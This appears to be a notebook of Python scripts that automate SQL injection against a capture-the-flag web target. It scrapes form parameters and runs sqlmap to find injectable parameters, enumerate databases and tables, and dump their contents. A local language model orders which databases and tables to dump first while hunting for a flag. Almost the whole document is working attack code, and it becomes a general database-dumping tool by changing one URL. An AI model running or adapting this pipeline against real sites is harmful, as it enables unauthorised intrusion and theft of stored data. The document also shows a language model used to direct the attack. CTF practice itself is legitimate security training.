```python
import torch
from transformers import AutoTokenizer, AutoModelForCausalLM

def generate_response(prompt, tokenizer, model, max_length=200, temperature=0.7, top_p=0.9, device='cuda'):
    """
    Generate a response from a causal language model based on the given prompt.

    Args:
        prompt (str): The input prompt to pass to the model.
        tokenizer (transformers.PreTrainedTokenizer): The tokenizer associated with the model.
        model (transformers.PreTrainedModel): The loaded Hugging Face model for causal language modeling.
        max_length (int, optional): Maximum length of the generated text. Defaults to 200.
        temperature (float, optional): Sampling temperature for text generation. Defaults to 0.7.
        top_p (float, optional): Nucleus sampling parameter. Defaults to 0.9.
        device (str, optional): Device to run the model on ('cpu' or 'cuda'). Defaults to 'cuda'.

    Returns:
        str: The generated text response.
    """

    model.to(device)
    model.eval()


    inputs = tokenizer(prompt, return_tensors="pt").to(device)


    with torch.no_grad():
        output = model.generate(
            inputs["input_ids"],
            max_length=max_length,
            temperature=temperature,
            top_p=top_p,
            do_sample=True,
            pad_token_id=tokenizer.pad_token_id,
            eos_token_id=tokenizer.eos_token_id,
        )


    generated_text = tokenizer.decode(output[0], skip_special_tokens=True)
    return generated_text



    tokenizer = AutoTokenizer.from_pretrained("deepseek-ai/DeepSeek-R1-Distill-Qwen-1.5B")
    model = AutoModelForCausalLM.from_pretrained("deepseek-ai/DeepSeek-R1-Distill-Qwen-1.5B").cuda()


    prompt = "What are the applications of artificial intelligence in healthcare?"


    response = generate_response(prompt, tokenizer, model, max_length=150, temperature=0.7, top_p=0.9, device='cuda')

    print("Prompt:", prompt)
    print("Response:", response)
```

# Extract Parameters With Deepseek

```python
import requests
from bs4 import BeautifulSoup
import json
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch

def parse_html(url):
    """
    Fetch HTML content from the provided URL, parse it to extract form, dropdown, and script parameters,
    and return the structured data.

    Args:
        url (str): The URL to fetch.

    Returns:
        tuple: A dictionary with extracted parameters and the raw HTML content.
    """
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException:
        return {}, ""

    html_content = response.text
    soup = BeautifulSoup(html_content, 'html.parser')

    # Extract dropdown parameters
    dropdown_params = {}
    for select in soup.find_all('select'):
        param_name = select.get('name', 'N/A')
        param_values = [option.get('value') or option.text.strip() for option in select.find_all('option')]
        dropdown_params[param_name] = param_values

    # Extract form parameters
    form_params = {}
    for form in soup.find_all('form'):
        form_method = form.get('method', 'GET').upper()
        form_action = form.get('action', 'N/A')
        inputs = form.find_all('input')
        form_fields = {inp.get('name', 'N/A'): inp.get('value', '') or 'default'
                       for inp in inputs if inp.get('name')}
        form_params[form_action] = {
            'method': form_method,
            'fields': form_fields,
        }


    script_params = []
    for script in soup.find_all('script'):
        if script.string and 'doReload' in script.string:
            script_params.append({'param': 'placeholder_param', 'value': 'placeholder_value'})

    # Combine all parameters into a structured dictionary
    extracted_data = {
        "dropdown_parameters": dropdown_params,
        "form_parameters": {
            action: {
                "method": details.get("method", "N/A"),
                "fields": {k: v for k, v in details.get("fields", {}).items() if v}
            }
            for action, details in form_params.items()
        },
        "script_parameters": script_params,
    }

    return extracted_data, html_content

def load_model_and_tokenizer(model_name="deepseek-ai/DeepSeek-R1-Distill-Qwen-1.5B"):
    """
    Load the tokenizer and model from Hugging Face.

    Args:
        model_name (str): The name or path of the pre-trained model.

    Returns:
        tuple: The loaded tokenizer and model, or (None, None) if loading fails.
    """
    try:
        tokenizer = AutoTokenizer.from_pretrained(model_name)
        model = AutoModelForCausalLM.from_pretrained(model_name)
        if torch.cuda.is_available():
            model = model.cuda()
        return tokenizer, model
    except Exception:
        return None, None

def process_data_with_model(prompt, tokenizer, model, max_length=512):
    """
    Process the given prompt using the loaded language model.

    Args:
        prompt (str): The input prompt for the model.
        tokenizer: The loaded tokenizer.
        model: The loaded language model.
        max_length (int): The maximum length for the generated output.

    Returns:
        str: The generated text from the model.
    """
    try:
        inputs = tokenizer.encode(prompt, return_tensors="pt")
        if torch.cuda.is_available():
            inputs = inputs.cuda()
        outputs = model.generate(
            inputs,
            max_length=max_length,
            num_return_sequences=1,
            no_repeat_ngram_size=2,
            early_stopping=True
        )
        generated_text = tokenizer.decode(outputs[0], skip_special_tokens=True)
        return generated_text
    except Exception:
        return ""

def identify_additional_parameters(extracted_data, html_content, tokenizer, model):
    """
    Use the language model to identify additional parameters from the HTML content.

    Args:
        extracted_data (dict): The initially extracted parameters.
        html_content (str): The raw HTML content.
        tokenizer: The loaded tokenizer.
        model: The loaded language model.

    Returns:
        dict: Additional parameters identified by the model.
    """
    prompt = (
        "You are an assistant that analyzes HTML content to identify all possible parameters "
        "used in forms, dropdowns, scripts, and other interactive elements. Given the following "
        "extracted data and HTML content, identify any additional parameters that were not "
        "originally extracted.\n\n"
        f"Extracted Data:\n{json.dumps(extracted_data, indent=2)}\n\n"
        f"HTML Content:\n{html_content}\n\n"
        "List any additional parameters in JSON format with a structure similar to the extracted data."
    )

    generated_output = process_data_with_model(prompt, tokenizer, model)

    try:
        additional_params = json.loads(generated_output)
        return additional_params
    except json.JSONDecodeError:
        return {}


```

# Find the vulnerable parameters from found parameters

```python
import requests
import re
import subprocess
import logging
from bs4 import BeautifulSoup
from collections import namedtuple

def sqlmap_vulnerability_scan(base_url, crawl_depth=2, target_param=None, target_value=None):
    """
    Performs a full SQL Injection vulnerability scan using sqlmap on the specified URL.

    Args:
        base_url (str): The URL of the target application.
        crawl_depth (int): Depth of crawling for sqlmap.
        target_param (str): Specific parameter to target.
        target_value (str): Specific value to target within the parameter.

    Returns:
        List[Vulnerability]: A list of isolated vulnerabilities.
    """

    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')


    Vulnerability = namedtuple('Vulnerability', ['parameter', 'value', 'method', 'place', 'payload'])

    # Path to your local sqlmap
    SQLMAP_BIN = ["python", "sqlmap-dev/sqlmap.py"]

    def infer_form_parameters(url):
        """Parse forms from the URL and extract their parameters."""
        logging.info(f"[AGENT] Fetching {url} to parse forms...")
        try:
            resp = requests.get(url, timeout=10)
            resp.raise_for_status()
        except requests.RequestException as e:
            logging.error(f"[AGENT] Error fetching {url}: {e}")
            return []

        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        logging.info(f"[AGENT] Found {len(forms)} form(s) in the HTML for {url}.")

        forms_data = []
        for i, form in enumerate(forms, start=1):
            method = form.get("method", "GET").upper()
            action = form.get("action", "").strip()
            action = action if action else url

            input_elements = form.find_all(["input", "select", "textarea"])
            inputs_list = []
            for inp in input_elements:
                name = inp.get("name")
                if not name:
                    continue
                input_type = inp.get("type", "text") if inp.name == "input" else inp.name
                value = inp.get("value", "")
                inputs_list.append({"name": name, "type": input_type, "value": value})

            forms_data.append({
                "action": action,
                "method": method,
                "inputs": inputs_list
            })
            logging.info(f"[AGENT] Form {i}: action={action}, method={method}, inputFields={len(inputs_list)}")
        return forms_data

    def run_sqlmap(args):
        """Run sqlmap with the provided arguments and return the result."""
        cmd = SQLMAP_BIN + args
        logging.info(f"[SQLMAP] Running: {' '.join(cmd)}")
        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                logging.error(f"[SQLMAP] sqlmap execution failed with return code {result.returncode}")
                logging.error(f"[SQLMAP] STDERR: {result.stderr}")
            else:
                logging.info("[SQLMAP] sqlmap execution completed successfully.")
            return result
        except Exception as e:
            logging.exception("[SQLMAP] Exception while running sqlmap.")
            return None

    def parse_sqlmap_output_for_payload(stdout, param_name):
        """Extract the payload for a specific parameter from sqlmap output."""
        lines = stdout.splitlines()
        for idx, line in enumerate(lines):
            if "payload:" in line.lower():
                payload_line = line.split("Payload:", 1)[1].strip()
                if re.search(rf"{re.escape(param_name)}=", payload_line, re.IGNORECASE):
                    return payload_line
        return None

    def broad_sqlmap_scan(url, depth):
        """Run sqlmap's broad scan on the target URL."""
        logging.info(f"[AGENT] Starting broad sqlmap scan on {url} with crawl depth {depth}...")
        args = [
            "-u", url,
            "--batch",
            "--random-agent",
            f"--crawl={depth}",
            "--forms",
            "--risk=1",
            "--level=1",
            "-v", "3",
            "--flush-session"
        ]
        result = run_sqlmap(args)
        if not result or result.returncode != 0:
            logging.error("[AGENT] Broad sqlmap scan failed.")
            return []

        vulnerable_params = []
        lines = result.stdout.splitlines()
        for idx, line in enumerate(lines):
            if "parameter:" in line.lower():
                parts = line.split(":", 1)
                if len(parts) == 2:
                    param_name = parts[1].split("(")[0].strip()
                    param_place = parts[1].split("(")[1].strip(") ").upper()
                    payload = parse_sqlmap_output_for_payload("\n".join(lines[idx:]), param_name)
                    if payload:
                        vulnerable_params.append({
                            "param": param_name,
                            "place": param_place,
                            "payload": payload
                        })
        logging.info(f"[AGENT] Found {len(vulnerable_params)} vulnerable parameter(s).")
        return vulnerable_params

    def isolate_parameter_vulnerabilities(vulnerable_params, target_param=None, target_value=None):
        """Filter vulnerabilities to isolate specific parameters or values."""
        isolated = []
        for vp in vulnerable_params:
            if target_param and target_value:
                if vp["param"].lower() == target_param.lower() and target_value in vp["payload"]:
                    isolated.append(Vulnerability(
                        parameter=vp["param"],
                        value=target_value,
                        method="GET",
                        place=vp.get("place", "N/A"),
                        payload=vp["payload"]
                    ))
            else:
                isolated.append(Vulnerability(
                    parameter=vp["param"],
                    value=vp["payload"].split("=")[-1] if "=" in vp["payload"] else "N/A",
                    method="GET",
                    place=vp.get("place", "N/A"),
                    payload=vp["payload"]
                ))
        logging.info(f"[AGENT] Isolated {len(isolated)} vulnerabilities.")
        return isolated


    logging.info(f"[AGENT] Starting vulnerability scan for {base_url}...")


    forms_data = infer_form_parameters(base_url)
    if not forms_data:
        logging.error("[AGENT] No forms found. Exiting.")
        return []


    broad_vulnerabilities = broad_sqlmap_scan(base_url, crawl_depth)
    if not broad_vulnerabilities:
        logging.info("[AGENT] No vulnerabilities found during broad scan.")
        return []


    isolated_vulnerabilities = isolate_parameter_vulnerabilities(broad_vulnerabilities, target_param, target_value)

    logging.info("[AGENT] Vulnerability scan completed.")
    return isolated_vulnerabilities
```

```python
def reorder_list_with_model(items, item_type):
    """
    Reorder a list of items (databases or tables) based on the likelihood of containing the flag using the language model.

    Args:
        items (list): List of database or table names.
        item_type (str): Type of items being reordered ('database' or 'table').

    Returns:
        list: Reordered list of items.
    """
    if not items:
        logging.warning(f"No {item_type}s to reorder.")
        return items

    prompt = f"""
You are an intelligent assistant tasked with prioritizing {item_type}s based on the likelihood of containing a security flag in a CTF challenge.
Given the following list of {item_type}s, reorder them starting with the most likely to contain the flag.

List of {item_type}s:
{', '.join(items)}

Please provide the reordered list as a comma-separated sequence.
"""

    try:
        inputs = tokenizer(prompt, return_tensors="pt").to('cuda')

        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=150,
                temperature=0.3,
                top_p=0.9,
                do_sample=False
            )

        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        logging.debug(f"Model response for reordering {item_type}s:\n{response}")


        match = re.search(r"reordered list as a comma-separated sequence\.?\s*(.*)", response, re.IGNORECASE | re.DOTALL)
        if match:
            reordered = match.group(1).strip()
            reordered_list = [item.strip() for item in reordered.split(',') if item.strip()]
            if set(reordered_list) == set(items):
                logging.info(f"Reordered {item_type}s: {reordered_list}")
                return reordered_list
            else:
                logging.warning(f"Model's reordered list does not match the original items for {item_type}s.")
                logging.warning(f"Original: {items}")
                logging.warning(f"Model Output: {reordered_list}")
                return items  # Return the original list if mismatch
        else:
            logging.warning(f"Could not parse model's response for reordering {item_type}s.")
            return items  # Return the original list if parsing fails
    except Exception as e:
        logging.exception(f"Exception during reordering {item_type}s with model: {e}")
        return items  # Return the original list in case of any exception
```

```python
import subprocess
import re
import logging
import sys
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch
from collections import namedtuple


SQLMAP_BIN = ["python", "sqlmap-dev/sqlmap.py"]
FLAG_PATTERN = r"Hacking-Arena\{.*?\}"
BASE_URL = "http://r2d2.hackingarena.com:1819/index.php"


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("scan_log.log")
    ]
)

Vulnerability = namedtuple('Vulnerability', ['parameter', 'value', 'method', 'place', 'payload'])


try:
    tokenizer = AutoTokenizer.from_pretrained("deepseek-ai/DeepSeek-R1-Distill-Qwen-1.5B")
    model = AutoModelForCausalLM.from_pretrained("deepseek-ai/DeepSeek-R1-Distill-Qwen-1.5B").cuda()
    logging.info("Language model loaded successfully.")
except Exception as e:
    logging.exception(f"Model loading failed: {e}")
    sys.exit(1)

def run_sqlmap(args):
    """Execute SQLMap with proper output handling."""
    try:
        cmd = SQLMAP_BIN + args
        logging.info(f"Executing: {' '.join(cmd)}")
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        logging.error(f"SQLMap error {e.returncode}: {e.stderr}")
        return None
    except Exception as e:
        logging.exception(f"Execution failed: {e}")
        return None

def reorder_list_with_model(items, item_type, request_cot=False, temperature=0.7, top_p=0.9):
    """Reorder items using LLM with strict output formatting."""
    if not items:
        return items

    # prompt templates
    base_prompt = f"""You are a CTF expert analyzing {item_type} names. Below is a list:
{', '.join(items)}

Reorder these from MOST to LEAST likely to contain a flag using EXACTLY this format:
Final ordered list: [comma-separated names]

Rules:
- Only include the final list line
- Use exact original names
- No explanations or formatting"""

    if request_cot:
        base_prompt = f"""You are a CTF expert analyzing {item_type} names. List:
{', '.join(items)}

Analyze which {item_type} is most flag-containing (consider: flag, secrets, data names, CTF conventions). Then provide:

Final ordered list: [comma-separated names]

Rules:
- Keep analysis under 3 lines
- Final list must be standalone
- Use exact names"""

    try:
        inputs = tokenizer(base_prompt, return_tensors="pt").to('cuda')
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=150,
                temperature=temperature,
                top_p=top_p,
                do_sample=True,
                pad_token_id=tokenizer.eos_token_id
            )

        response = tokenizer.decode(outputs[0], skip_special_tokens=True)


        list_match = re.search(r"Final ordered list:\s*([^\n]+)", response)
        if list_match:
            ordered_str = list_match.group(1).strip()
            splitted = [s.strip() for s in ordered_str.split(',')]
        else:
            splitted = items  # Fallback if pattern missing


        if set(splitted) == set(items) and len(splitted) == len(items):
            return splitted
        return items

    except Exception as e:
        logging.exception(f"Reorder error: {e}")
        return items

def find_flag_using_vulnerabilities(vulnerabilities, request_cot=False):
    """Main flag discovery workflow with prioritized enumeration."""
    for vuln in vulnerabilities:
        logging.info(f"Testing vulnerability: {vuln.parameter}")

        # Database enumeration
        db_output = run_sqlmap([
            "-u", f"{BASE_URL}?{vuln.payload}",
            "-p", vuln.parameter,
            "--batch",
            "--dbs"
        ])
        databases = re.findall(r"\[\*\] (\w+)", db_output) if db_output else []
        databases = reorder_list_with_model(databases, "database", request_cot)
        logging.info(f"Prioritized databases: {databases}")

        for db in databases:
            # Table enumeration
            tb_output = run_sqlmap([
                "-u", f"{BASE_URL}?{vuln.payload}",
                "-p", vuln.parameter,
                "--batch",
                "-D", db,
                "--tables"
            ])
            tables = re.findall(r"\|\s*(\w+)\s*\|", tb_output) if tb_output else []
            tables = reorder_list_with_model(tables, "table", request_cot)
            logging.info(f"Prioritized tables in {db}: {tables}")

            for table in tables:
                # Data dumping
                data_output = run_sqlmap([
                    "-u", f"{BASE_URL}?{vuln.payload}",
                    "-p", vuln.parameter,
                    "--batch",
                    "-D", db,
                    "-T", table,
                    "--dump"
                ])
                if flag_match := re.search(FLAG_PATTERN, data_output or ""):
                    print(f"Flag found: {flag_match.group(0)}")
                    return flag_match.group(0)
    return None


def main():
    """Main execution flow"""
    vulnerabilities = sqlmap_vulnerability_scan(BASE_URL)
    if not vulnerabilities:
        logging.error("No vulnerabilities found")
        return

    flag = find_flag_using_vulnerabilities(vulnerabilities, request_cot=True)
    print(f"Final result: {flag}" if flag else "Flag not found")

if __name__ == "__main__":
    main()
```
